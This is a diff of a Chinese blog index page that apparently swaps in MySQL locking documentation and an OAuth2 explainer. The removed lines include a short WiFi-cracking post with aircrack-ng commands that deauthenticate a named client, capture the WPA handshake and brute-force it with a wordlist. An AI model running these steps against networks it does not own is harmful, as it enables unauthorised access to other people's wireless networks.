temp_t1，并从临时表中的行更新真正的表：</span><br><span class="line"></span><br><span class="line">mysql&gt; LOCK TABLES t1 WRITE, temp_t1 WRITE;</span><br><span class="line">mysql&gt; INSERT INTO t1 SELECT * FROM temp_t1;</span><br><span class="line">mysql&gt; DELETE FROM temp_t1;</span><br><span class="line">mysql&gt;UNLOCK TABLES;</span><br><span class="line">选择锁定类型</span><br><span class="line">通常，在以下情况下，表锁优于行级锁：</span><br><span class="line"></span><br><span class="line">该表的大多数语句都是读取。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">该表的声明是读取和写入的混合，其中写入是对单个行的更新或删除，可以通过读取一个密钥来读取：</span><br><span class="line"></span><br><span class="line">UPDATE tbl_nameSET column= valueWHERE unique_key_col= key_value;</span><br><span class="line">DELETE FROM tbl_nameWHERE unique_key_col= key_value;</span><br><span class="line">SELECT结合并发INSERT 语句，并且很少 UPDATE或者 DELETE语句。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">许多扫描或GROUP BY整个表上的操作，没有任何作家。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对于更高级别的锁定，您可以通过支持不同类型的锁定来更轻松地调整应用程序，因为锁定开销低于行级锁定。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">行级锁定以外的选项：</span><br><span class="line"></span><br><span class="line">版本控制（例如在MySQL中用于并发插入的版本），可以在多个读者的同一时间拥有一个作者。</span><br><span class="line">这意味着根据访问何时开始，数据库或表支持不同数据视图。</span><br><span class="line">这个其他常见的术语是 “ 时间旅行， ” “ 上写副本， ” 或“ 按需复制。</span><br><span class="line">”</span><br><span class="line"></span><br><span class="line">在许多情况下，按需复制优于行级锁定。</span><br><span class="line">但是，在最坏的情况下，它可以使用比使用普通锁更多的内存。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">而不是使用行级锁，你可以使用应用程序级锁，如提供的 GET_LOCK()和 RELEASE_LOCK()在MySQL。</span><br><span class="line">这些是咨询锁，因此它们只能与相互合作的应用程序一起工作。</span><br><span class="line">参见 第12.20节“其他功能”。</span><br></pre></td></tr></table></figure>
+<p>8.11.2表锁定问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">InnoDB表使用行级锁定，以便多个会话和应用程序可以同时读取和写入同一个表，而不会让对方等待或产生不一致的结果。</span><br><span class="line">对于这个存储引擎，避免使用该LOCK TABLES语句，因为它没有提供任何额外的保护，而是降低了并发性。</span><br><span class="line">自动行级锁定使得这些表适合于最繁忙的数据库以及最重要的数据，同时还可以简化应用程序逻辑，因为您不需要锁定和解锁表。</span><br><span class="line">因此， InnoDB存储引擎是MySQL中的默认设置。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL除了为所有存储引擎使用表锁（而不是页锁，行锁或列锁） InnoDB。</span><br><span class="line">锁定操作本身没有太多的开销。</span><br><span class="line">但是因为只有一个会话可以同时写入一个表，为了获得这些其他存储引擎的最佳性能，请将它们主要用于经常查询且很少插入或更新的表。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">性能考虑因素支持InnoDB</span><br><span class="line"></span><br><span class="line">锁定性能问题的解决方法</span><br><span class="line"></span><br><span class="line">性能考虑因素支持InnoDB</span><br><span class="line">在选择是使用InnoDB或不同的存储引擎创建表时 ，请记住表锁定的以下缺点：</span><br><span class="line"></span><br><span class="line">表锁定使许多会话可以同时从表中读取数据，但是如果会话要写入表中，它必须首先获得独占访问权，这意味着它可能必须先等待其他会话完成表。</span><br><span class="line">在更新期间，想要访问此特定表的所有其他会话必须等到更新完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当会话正在等待时，表锁定会导致问题，因为磁盘已满并且在会话可继续之前需要有空闲空间。</span><br><span class="line">在这种情况下，所有希望访问问题表的会话也会处于等待状态，直到有更多磁盘空间可用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">一个SELECT是需要长时间运行的语句防止其他会话更新表的同时，使其他场次出现缓慢或无响应。</span><br><span class="line">虽然会话正在等待独占访问表以进行更新，但发出SELECT语句的其他会话 将排在其后面，即使对于只读会话也会降低并发性。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">锁定性能问题的解决方法</span><br><span class="line">以下各项介绍了一些避免或减少表锁定引起的争用的方法：</span><br><span class="line"></span><br><span class="line">考虑将表切换到 InnoDB存储引擎，或者 CREATE TABLE ... ENGINE=INNODB在安装期间使用，或者使用ALTER TABLE ... ENGINE=INNODB现有的表。</span><br><span class="line">有关此存储引擎的更多详细信息，请参见 第14章，InnoDB存储引擎。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">优化SELECT语句以加快运行速度，以便锁定表的时间更短。</span><br><span class="line">您可能需要创建一些汇总表来执行此操作。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">启动mysqld的使用 --low-priority-updates。</span><br><span class="line">对于仅使用表级锁（如存储引擎 MyISAM，MEMORY和 MERGE），这给所有的语句更新（修改），比表低优先级 SELECT的语句。</span><br><span class="line">在这种情况下，SELECT 前面的场景中的第二个语句将在UPDATE语句之前执行，并且不会等待第一个语句 SELECT完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要指定在特定连接中发出的所有更新应该以低优先级完成，请将low_priority_updates 服务器系统变量设置 为1。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要给出特定的INSERT， UPDATE或 DELETE语句较低的优先级，请使用该LOW_PRIORITY 属性。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要给出特定的SELECT 声明更高的优先级，请使用该 HIGH_PRIORITY属性。</span><br><span class="line">请参见 第13.2.9节“SELECT语法”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以 系统变量的较低值 启动mysqld， max_write_lock_count以强制MySQL临时提升SELECT 在发生特定数量的表插入后等待表的所有语句的优先级。</span><br><span class="line">这允许 READ在一定数量的锁定之后进行 WRITE锁定。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果你有问题 INSERT联合 SELECT，可考虑改用MyISAM表，它支持并发SELECT和 INSERT报表。</span><br><span class="line">（参见 第8.11.3节“并发插入”）。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果你有问题，混合 SELECT和 DELETE报表，该 LIMIT选项 DELETE可能会有帮助。</span><br><span class="line">请参见 第13.2.2节“删除语法”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用SQL_BUFFER_RESULTwith SELECT语句可以帮助缩短表锁的持续时间。</span><br><span class="line">请参见 第13.2.9节“SELECT语法”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过允许查询针对一个表中的列运行，而将更新限制在不同表中的列中，将表内容拆分为单独的表格可能会有所帮助。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">您可以将锁定代码更改 mysys/thr_lock.c为使用单个队列。</span><br><span class="line">在这种情况下，写入锁和读取锁具有相同的优先级，这可能有助于某些应用程序。</span><br></pre></td></tr></table></figure></p>
+<p>8.11.3并发插入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">该MyISAM存储引擎支持并发插入，减少读者和作者之间的竞争给定表：如果一个MyISAM表已经在数据文件中没有孔（中删除的行），一个 INSERT语句可以执行行添加到表的末尾同时 SELECT语句正在读取表格中的行。</span><br><span class="line">如果有多个 INSERT语句，它们将按照顺序排列并执行，并与SELECT语句同时执行 。</span><br><span class="line">并发的结果INSERT可能不会立即显示。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">所述concurrent_insert系统变量可以被设置为修改并发插入处理。</span><br><span class="line">默认情况下，该变量设置为AUTO（或1），并按前面所述处理并发插入。</span><br><span class="line">如果 concurrent_insert设置为 NEVER（或0），则禁用并发插入。</span><br><span class="line">如果变量设置为ALWAYS （或2），即使对于已删除行的表，也允许在表的末尾进行并发插入。</span><br><span class="line">另请参阅concurrent_insert系统变量的说明。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果您正在使用二进制日志，并发插入将转换为正常的插入CREATE ... SELECT或 INSERT ... SELECT语句。</span><br><span class="line">这样做是为了确保您可以通过在备份操作期间应用日志来重新创建表的精确副本。</span><br><span class="line">请参见第5.4.4节“二进制日志”。</span><br><span class="line">另外，对于这些语句，在选定表上放置一个读锁，以便阻止插入到该表中。</span><br><span class="line">结果是该表的并发插入必须等待。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">有了LOAD DATA INFILE，如果你指定CONCURRENT 一个MyISAM满足并发插入的状态表（即，它包含在中间没有空闲块），其他会话可以从表中检索数据时LOAD DATA正在执行。</span><br><span class="line">即使没有其他会话同时使用该表，该CONCURRENT选项的使用LOAD DATA也会影响一个位的性能。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果指定HIGH_PRIORITY，则会覆盖该--low-priority-updates选项的效果（ 如果服务器是使用该选项启动的）。</span><br><span class="line">这也会导致并发插入不被使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为LOCK TABLE，之间的差READ LOCAL并且READ是 READ LOCAL允许非冲突性的 INSERT语句（并发插入），而锁被保持来执行。</span><br><span class="line">但是，如果要在持有锁的同时使用服务器外部的进程来操作数据库，则无法使用此功能。</span><br></pre></td></tr></table></figure></p>
+<p>8.11.4元数据锁定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">MySQL使用元数据锁定来管理对数据库对象的并发访问并确保数据一致性。</span><br><span class="line">元数据锁定不仅适用于表格，还适用于架构，存储的程序（过程，函数，触发器和预定事件）以及表空间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">元数据锁定确实涉及一些开销，随着查询量的增加而增加。</span><br><span class="line">元数据争用增加了多个查询尝试访问相同对象的次数越多。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">元数据锁定不是表格定义缓存的替代，其互斥锁和锁定与互斥锁不同 LOCK_open。</span><br><span class="line">以下讨论提供了有关元数据锁定工作原理的一些信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为确保事务可序列化，服务器不得允许一个会话在另一个会话中未完成显式或隐式启动事务中使用的表上执行数据定义语言（DDL）语句。</span><br><span class="line">服务器通过获取事务内使用的表上的元数据锁，并推迟释放这些锁，直到事务结束为止。</span><br><span class="line">表上的元数据锁可以防止对表的结构进行更改。</span><br><span class="line">这种锁定方式意味着一个会话中的事务正在使用的表不能在其他会话中用于DDL语句，直到事务结束。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这个原则不仅适用于事务表，也适用于非事务表。</span><br><span class="line">假设一个会话开始一个使用事务表t 和非事务表的事务nt，如下所示：</span><br><span class="line"></span><br><span class="line">开始交易;</span><br><span class="line">SELECT * FROM t;</span><br><span class="line">SELECT * FROM nt;</span><br><span class="line">服务器在两端都保存了元数据锁t， nt直到事务结束。</span><br><span class="line">如果另一个会话尝试对任一表执行DDL或写入锁定操作，则会阻塞，直到事务结束时释放元数据锁。</span><br><span class="line">例如，如果第二个会话尝试执行以下任何操作，则会阻止：</span><br><span class="line"></span><br><span class="line">DROP TABLE t;</span><br><span class="line">ALTER TABLE t ...;</span><br><span class="line">DROP TABLE nt;</span><br><span class="line">ALTER TABLE nt ...;</span><br><span class="line">LOCK TABLE t ... WRITE;</span><br><span class="line">The相同的行为适用于The LOCK TABLES ... READ。</span><br><span class="line">也就是说，更新任何表（事务性或非事务性）的显式或隐式启动事务将被阻塞并被LOCK TABLES ... READ该表阻塞。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果服务器为语句有效但在执行期间失败的语句获取元数据锁，则它不会提前释放锁。</span><br><span class="line">锁释放仍然延迟到事务结束，因为失败的语句被写入二进制日志，并且锁保护日志一致性。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在自动提交模式下，每条语句实际上是一个完整的事务，因此为语句获取的元数据锁只保留在语句的末尾。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在PREPARE准备好声明后，即使在多语句事务中进行准备，也会释放在声明中获取的元数据锁定 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.11.5外部锁定</span><br><span class="line">外部锁定是使用文件系统锁定来管理MyISAM多个进程对数据库表的争用。</span><br><span class="line">外部锁定用于单个进程（如MySQL服务器）不能被认为是需要访问表的唯一进程的情况。</span><br><span class="line">这里有些例子：</span><br><span class="line"></span><br><span class="line">如果运行多个使用相同数据库目录的服务器（不推荐），则每台服务器都必须启用外部锁定。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果使用myisamchk在表上执行表维护操作 MyISAM，则必须确保服务器未运行，或者服务器启用了外部锁定，以便根据需要锁定表文件以与myisamchk协调 访问表。</span><br><span class="line">使用myisampack打包 MyISAM表格也是如此 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果服务器在启用外部锁定的情况下运行，则可以随时使用myisamchk进行读取操作，例如检查表。</span><br><span class="line">在这种情况下，如果服务器尝试更新myisamchk正在使用的表， 服务器将在继续之前等待myisamchk完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果使用myisamchk进行写入操作（如修复或优化表），或者如果使用 myisampack打包表，则 必须始终确保 mysqld服务器不使用表。</span><br><span class="line">如果您不停止mysqld，至少 在运行myisamchk之前执行 mysqladmin flush-tables。</span><br><span class="line">如果服务器和 myisamchk同时访问表，您的表可能会损坏。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在外部锁定生效的情况下，每个需要访问表的进程在继续访问表之前都会获取表文件的文件系统锁。</span><br><span class="line">如果无法获取所有必需的锁，则会阻止进程访问表，直到获得锁（在当前持有锁的进程释放它们之后）。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">外部锁定会影响服务器性能，因为服务器在访问表之前必须等待其他进程。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果您运行单个服务器来访问给定的数据目录（通常情况下），并且在服务器运行时没有其他程序（如myisamchk）需要修改表，则不需要外部锁定。</span><br><span class="line">如果只 使用其他程序读取表，则不需要外部锁定，但 如果服务器在myisamchk正在读取表格时更改表，myisamchk可能会报告警告 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在禁用外部锁定的情况下，要使用 myisamchk，必须在执行myisamchk时停止服务器，否则在运行myisamchk之前锁定并刷新表。</span><br><span class="line">（请参见第8.12.1节“系统因素”。</span><br><span class="line">）为避免此要求，请使用CHECK TABLE 和REPAIR TABLE语句来检查和修复MyISAM表格。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对于mysqld，外部锁定由skip_external_locking系统变量的值控制 。</span><br><span class="line">当这个变量被启用时，外部锁定被禁用，反之亦然。</span><br><span class="line">外部锁定默认是禁用的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用--external-locking或 --skip-external-locking 选项可以在服务器启动时控制使用外部锁定。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果确实使用外部锁定选项来启用对MyISAM来自多个MySQL进程的表的更新 ，则必须确保满足以下条件：</span><br><span class="line"></span><br><span class="line">不要将查询缓存用于使用另一个进程更新的表的查询。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">不要使用该--delay-key-write=ALL选项启动服务器，也不要 使用DELAY_KEY_WRITE=1任何共享表的表选项。</span><br><span class="line">否则，可能会发生索引损坏。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">满足这些条件的最简单方法是始终 --external-locking与--delay-key-write=OFF和 一起使用 --query-cache-size=0。</span><br><span class="line">（这不是默认完成的，因为在许多设置中，混合使用上述选项很有用。）</span><br></pre></td></tr></table></figure></p>
 
           
         
@@ -1841,28 +2080,35 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/https/" rel="bookmark">Https协议</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-thread/" rel="bookmark">SQL优化【线程信息检查】</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/amqp/" rel="bookmark">AMQP</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-sentence/" rel="bookmark">SQL优化【SQL语句】</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/rpc/" rel="bookmark">RPC</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-total/" rel="bookmark">SQL优化【总方向】</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/about-agreement/" rel="bookmark">关于协议</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-data-structure/" rel="bookmark">SQL优化【数据结构】</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-cached/" rel="bookmark">SQL优化【缓存优化】</a></div>
       
     </li>
   
@@ -1919,7 +2165,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/wifi-violence/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-permission/oauth-oauth2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -1939,7 +2185,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/hack/wifi-violence/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">wifi破解</a>
+                <a href="/2018/03/24/service-permission/oauth-oauth2/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">OAuth OAuth2</a>
               
             
           </h2>
@@ -1982,7 +2228,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/hack/" itemprop="url" rel="index"><span itemprop="name">hack</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/service-permission/" itemprop="url" rel="index"><span itemprop="name">service-permission</span></a></span>
 
                 
                 
@@ -2018,8 +2271,18 @@
       
         
           
-            <p>利用网卡监控模式<br>监控wifi热点 .然后强制断开用户与路由连接.利用用户与路由四次握手机会获取握手包.然后跑字典</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># airmon-ng</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># airmon-ng start wlan0</span><br><span class="line">#wlan0为 上一个命令的Interface</span><br><span class="line"></span><br><span class="line"># airodump-ng wlan0mon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon</span><br><span class="line">-c 6:表示信道6 (ch)</span><br><span class="line"></span><br><span class="line"># aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</span><br><span class="line"></span><br><span class="line"># airmon-ng stop wlan0mon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</span><br><span class="line">#跑字典</span><br></pre></td></tr></table></figure>
+            <p>翻了几篇子 认证 csdn  一个模样 连错误都一样</p>
+<p>《用访问令牌到授权服务器换取访问令牌(accesstoken&amp;secret)》<br>这叫人怎么理解 ？？</p>
+<p>果断找官网<br><a href="https://oauth.net/core/1.0a/" target="_blank" rel="noopener">https://oauth.net/core/1.0a/</a></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-11e716dc12557360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><a href="https://oauth.net/2/" target="_blank" rel="noopener">https://oauth.net/2/</a></p>
+<p>{———-}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">OAuth2 授权类型</span><br><span class="line">1、运行在网络服务器，基于浏览器和移动应用程序的应用程序的授权码【web授权】</span><br><span class="line">2、密码为与登录用户名和密码</span><br><span class="line">3、客户端凭证的应用程序访问</span><br><span class="line">4、Implicit以前曾被推荐给没有秘密的客户，但已被使用授权代码授权而没有秘密取代。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OAuth认证和授权的过程如下:</span><br><span class="line"></span><br><span class="line">1、用户访问第三方网站网站，想对用户存放在服务商的某些资源进行操作。</span><br><span class="line"></span><br><span class="line">2、第三方网站向服务商请求一个临时令牌。</span><br><span class="line"></span><br><span class="line">3、服务商验证第三方网站的身份后，授予一个临时令牌。</span><br><span class="line"></span><br><span class="line">4、第三方网站获得临时令牌后，将用户导向至服务商的授权页面请求用户授权，然后这个过程中将临时令牌和第三方网站的返回地址发送给服务商。</span><br><span class="line"></span><br><span class="line">5、用户在服务商的授权页面上输入自己的用户名和密码，授权第三方网站访问所相应的资源。</span><br><span class="line"></span><br><span class="line">6、授权成功后，服务商将用户导向第三方网站的返回地址。</span><br><span class="line"></span><br><span class="line">7、第三方网站根据临时令牌从服务商那里获取访问令牌。</span><br><span class="line"></span><br><span class="line">8、服务商根据令牌和用户的授权情况授予第三方网站访问令牌。</span><br><span class="line"></span><br><span class="line">9、第三方网站使用获取到的访问令牌访问存放在服务商的对应的用户资源。</span><br></pre></td></tr></table></figure>
+<p>国外文档：<a href="https://aaronparecki.com/oauth-2-simplified/" target="_blank" rel="noopener">https://aaronparecki.com/oauth-2-simplified/</a></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-ef3df8c7008fc91b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.jpg"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-ed27155395dbbf55.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.jpg"></p>
+<p>看不懂的用有道翻译啊[捂脸笑][捂脸笑][捂脸笑]</p>
+<p>巨详细的请求解释 看看国内的 mmp</p>
 
           
         
@@ -2035,35 +2298,21 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/service-permission/permission-data/" rel="bookmark">权限系统_数据权限控制</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/service-permission/shiro-1/" rel="bookmark">权限系统_shiro_授权流程</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/service-permission/shiro-2/" rel="bookmark">权限系统_shiro_验证流程</a></div>
       
     </li>
   
@@ -2127,7 +2376,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/17/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><span class="page-number current">18</span><a class="page-number" href="/page/19/">19</a><span class="space">&hellip;</span><a class="page-number" href="/page/33/">33</a><a class="extend next" rel="next" href="/page/19/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
